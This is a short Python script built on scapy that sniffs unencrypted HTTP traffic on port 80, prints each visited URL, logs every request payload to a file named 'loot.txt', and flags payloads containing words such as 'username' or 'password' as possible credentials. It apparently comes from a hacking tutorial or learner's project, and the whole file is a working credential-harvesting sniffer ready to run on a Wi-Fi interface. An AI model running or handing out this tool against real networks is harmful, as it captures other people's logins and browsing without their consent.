import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    #This filters specifically for port 80(HTTP)
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="port 80")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] Visiting: {url.decode()}")

        if packet.haslayer(scapy.Raw):
            # STEP 1: Define the variable first
            load = packet[scapy.Raw].load.decode(errors='ignore')
            
            # STEP 2: Save it to the file ONLY after it's defined
            with open("loot.txt", "a") as f:
                f.write(f"Website: {url.decode()} | Payload: {load}\n")
            
            # STEP 3: Check for keywords (the rest of your code)
            keywords = ["username", "user", "password", "pass", "login"]
            for word in keywords:
                if word in load.lower():
                    print(f"\n\n[!!!] Possible Credentials Found: {load}")
                    break
#Replace "Wi-Fi" with whatever your interface was in Wireshark
sniff("Wi-Fi")